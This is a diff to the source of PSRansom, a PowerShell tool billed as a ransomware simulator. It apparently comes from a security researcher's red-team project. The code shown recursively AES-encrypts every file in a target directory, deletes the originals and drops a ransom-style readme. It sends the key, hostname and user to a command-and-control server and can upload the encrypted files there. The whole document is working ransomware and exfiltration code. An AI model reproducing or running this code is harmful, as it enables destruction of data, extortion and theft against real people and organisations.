@@ -1,4 +1,4 @@
-﻿#================================#
+#================================#
 #     PSRansom by @JoelGMSec     #
 #      https://darkbyte.net      #
 #================================#
@@ -57,7 +57,7 @@ if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough p
 $AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
 
 # Functions
-$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower()
+$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower() ; $Readme = "readme.txt"
 $Time = Get-Date -Format "HH:mm - dd/MM/yy" ; $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
 if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" } 
 $DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }
@@ -152,7 +152,7 @@ function GetStatus {
 function SendResults {
    $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
    $C2Data = " [+] Key: $B64Key [+] Hostname: $computer [+] Current User: $domain$user [+] Current Time: $time"
-   $RansomLogs = Get-Content log.txt ; if (!$RansomLogs) { $RansomLogs = "[!] No files have been encrypted!" }
+   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch
    $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t $RansomLogs
    Invoke-WebRequest -useb "http://$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
    Invoke-WebRequest -useb "http://$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }
@@ -160,21 +160,29 @@ function SendResults {
 function SendOK {
    Invoke-WebRequest -useb "http://$C2Server`:$C2Port/done" -Method GET 2>&1> $null }
 
+function CreateReadme {
+   $ReadmeTXT = "All your files have been encrypted by PSRansom!`nBut don't worry, you can still recover them with the recovery key :)`n"
+   Remove-Item "$Directory$slash$Readme" ; Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
+   Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $PSRKey `n" }
+
 function EncryptFiles {
-   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
-      Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path log.txt -Value "[!] $i is now encrypted" ; Remove-Item $i }}
+   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude *.psr,readme.txt | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
+      Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now encrypted" ; Remove-Item $i }
+      $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch ; if (!$RansomLogs) { 
+      Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" }}
 
 function ExfiltrateFiles {
    Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
+   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
       $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
-      Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }
-   if (!$i){ $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
+      Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
+   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "http://$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
 
 function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
       Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".psr","")
-      Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue ; Remove-Item key.txt }}
+      Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue } ; Remove-Item "$Directory$slash$Readme" }
 
 function CheckFiles { 
    $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
@@ -191,20 +199,19 @@ if ($Mode -eq "-d") {
 else {
    Write-Host ; Write-Host "[!] Simulating ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
    Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
-   $C2Status = GetStatus ; Remove-Item log.txt ; sleep 1
+   $C2Status = GetStatus ; sleep 1
 
    Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
 
    Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
-   EncryptFiles ; if ($C2Status) { SendResults ; sleep 1
+   CreateReadme ; EncryptFiles ; if ($C2Status) { SendResults ; sleep 1
 
    if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
       ExfiltrateFiles ; sleep 1 }}
 
    if (!$C2Status) { Write-Host "[+] Saving key and logs to current folder.." -ForegroundColor Blue 
-      $RansomLogs = Get-Content log.txt ; if (!$RansomLogs) { Add-Content -Path log.txt -Value "[!] No files have been encrypted!" }
-      Add-Content -Path key.txt -Value $PSRKey }
-   else { Write-Host "[+] Sending key and logs to Command & Control Server.." -ForegroundColor Blue ; SendOK ; Remove-Item log.txt }}
+      $RansomLogs = Get-Content "$Directory$slash$Readme" ; if (!$RansomLogs) { Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" }}
+   else { Write-Host "[+] Sending key and logs to Command & Control Server.." -ForegroundColor Blue ; SendOK }}
 
 sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
